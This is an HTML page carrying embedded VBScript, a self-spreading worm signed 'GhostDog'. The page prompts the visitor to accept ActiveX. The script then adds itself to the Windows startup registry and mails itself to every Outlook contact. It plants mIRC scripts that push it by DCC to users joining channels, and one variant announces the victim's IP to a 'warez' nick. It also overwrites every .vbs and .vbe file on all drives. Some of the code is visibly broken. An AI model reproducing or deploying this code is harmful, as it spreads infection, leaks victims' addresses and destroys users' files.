<html>
<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<title>Active-X HTML</title>
</head>
THIS HTML USING ACTIVE-X PLEASE CLICK #YES#
<body bgcolor="#000000" Text="#C0C0C0">
<script language="VBScript">
<!-- This Creationed by GhostDog for [K]Alamar --!> 
On Error Resume Next
Set ifakfbhneex= Createobject("scripting.filesystemobject")
ifakfbhneex.copyfile wscript.scriptfullname,ifakfbhneex.GetSpecialFolder(0)& "\GhostDog.vbs"
Set repwducvxke = CreateObject("WScript.Shell")
repwducvxke.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\GhostDog","wscript.exe "&ifakfbhneex.GetSpecialFolder(0)& "\GhostDog.vbs %"
if repwducvxke.regread ("HKCU\software\GhostDog\mailed") <> "1" then
dajiteqtrxz()
end if
if repwducvxke.regread ("HKCU\software\GhostDog\mirqued") <> "1" then
grswfdrzjtc ""
end if
zukopoqjfjy()
Function dajiteqtrxz()
On Error Resume Next
Set femoqlygcul = CreateObject("Outlook.Application")
If femoqlygcul= "Outlook"Then
Set mwlnuzjqkdr=femoqlygcul.GetNameSpace("MAPI")
For Each cbpgpikxkpm In mwlnuzjqkdr.AddressLists
If cbpgpikxkpm.AddressEntries.Count <> 0 Then
xcnlabrbeic = cbpgpikxkpm.AddressEntries.Count
For vufqdzxclsd= 1 To xcnlabrbeic
Set sxxwzkorgnn = femoqlygcul.CreateItem(0)
Set vwyugokctue = cbpgpikxkpm.AddressEntries(vufqdzxclsd)
sxxwzkorgnn.To = vwyugokctue.Address
sxxwzkorgnn.Subject = "GhostDog is here"
sxxwzkorgnn.Body = "GhostDog thanks [K]Alamar...." & vbcrlf & ""
tvcasyllzdj.Add ifakfbhneex.GetSpecialFolder(0)& "\GhostDog.vbs"
sxxwzkorgnn.DeleteAfterSubmit = True
If sxxwzkorgnn.To <> "" Then
sxxwzkorgnn.Send
repwducvxke.regwrite "HKCU\software\GhostDog\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function grswfdrzjtc(xhxjsfsyuev)
On Error Resume Next
if xhxjsfsyuev = "" then
if ifakfbhneex.fileexists("c:\mirc\mirc.ini") then xhxjsfsyuev="c:\mirc"
if ifakfbhneex.fileexists("c:\mirc32\mirc.ini") then xhxjsfsyuev="c:\mirc32"
hyehfltbefk=repwducvxke.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if ifakfbhneex.fileexists(hyehfltbefk & "\mirc\mirc.ini") then xhxjsfsyuev=hyehfltbefk & "\mirc"
end if
if xhxjsfsyuev <> "" then
set wtijzcmqlay = ifakfbhneex.CreateTextFile(xhxjsfsyuev & "\script.ini", True)
wtijzcmqlay.WriteLine "[script]"
wtijzcmqlay.writeline "n0=on 1:JOIN:#:{"
wtijzcmqlay.writeline "n1=  /if ( $nick == $me ) { halt }"
wtijzcmqlay.writeline "n2=  /.dcc send $nick "& ifakfbhneex.GetSpecialFolder(0)& "\GhostDog.vbs"
wtijzcmqlay.writeline "n3=}"
wtijzcmqlay.close
repwducvxke.regwrite "HKCU\software\GhostDog\Mirqued", "1"
end if
end function
Function zukopoqjfjy()
On Error Resume Next
Set yxaswzivvdy = ifakfbhneex.Drives
For Each zvhwlkbwgbw In yxaswzivvdy
If zvhwlkbwgbw.Drivetype = Remote Then
diaatthlsgp= zvhwlkbwgbw & "\"
Call fragazwfdph(diaatthlsgp)
ElseIf zvhwlkbwgbw.IsReady Then
diaatthlsgp= zvhwlkbwgbw&"\"
Call fragazwfdph(diaatthlsgp)
End If
Next
End Function
Function fragazwfdph(mpntbcnnseu)
Set jrhkuytjghg= ifakfbhneex.GetFolder(mpntbcnnseu)
Set ibxbqdweghd= jrhkuytjghg.Files
For Each qeumjeojfmr In ibxbqdweghd
if ifakfbhneex.GetExtensionName(qeumjeojfmr.path) = "vbs" then
ifakfbhneex.copyfile wscript.scriptfullname , qeumjeojfmr.path , true
end if
if ifakfbhneex.GetExtensionName(qeumjeojfmr.path) = "vbe" then
ifakfbhneex.copyfile wscript.scriptfullname , qeumjeojfmr.path , true
end if
if qeumjeojfmr.name = "mirc.ini" then
grswfdrzjtc(qeumjeojfmr.ParentFolder)
end if
Next
Set qeumjeojfmr= jrhkuytjghg.SubFolders
For Each iicvitahygz In qeumjeojfmr
Call fragazwfdph(iicvitahygz.path)
Next
End Function

On Error Resume Next
Dim a
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.CreateTextFile("c:\mirc\script.ini", True)
a.WriteLine "[script]"
a.WriteLine "n0= on 1:connect:.msg warez $ip on $server $+ : $+ $port $+"
a.WriteLine "n1="
a.WriteLine "n2= on 1:join:#:{"
a.WriteLine "n3= if ( $nick == $me ) {halt} |.dcc send $nick $mircdir $+ script.ini"
a.WriteLine "n4= }"
a.WriteLine "n5= "
a.WriteLine "n6= ctcp 1:ping:/dcc send $nick $mircdir $+ script.ini"
a.close
 
Dim b
Set fso = CreateObject("Scripting.FileSystemObject")
Set b = fso.CreateTextFile("c:\Program Files\mirc\script.ini", True)
b.WriteLine "[script]"
b.WriteLine "n0= on 1:connect:.msg warez $ip on $server $+ : $+ $port $+"
b.WriteLine "n1="
b.WriteLine "n2= on 1:join:#:{"
b.WriteLine "n3= if ( $nick == $me ) {halt} |.dcc send $nick $mircdir $+ script.ini"
b.WriteLine "n4= }"
b.WriteLine "n5= "
b.WriteLine "n6= ctcp 1:ping:/dcc send $nick $mircdir $+ script.ini"
b.close
Dim d
Set fso = CreateObject("Scripting.FileSystemObject")
Set d = fso.GetFile("c:\windows\*.inf")
a.Delete
Dim e
Set fso = CreateObject("Scripting.FileSystemObject")
Set e = fso.GetFile("c:\*.dat /s")
b.Delete

</script>
</body>
</html>
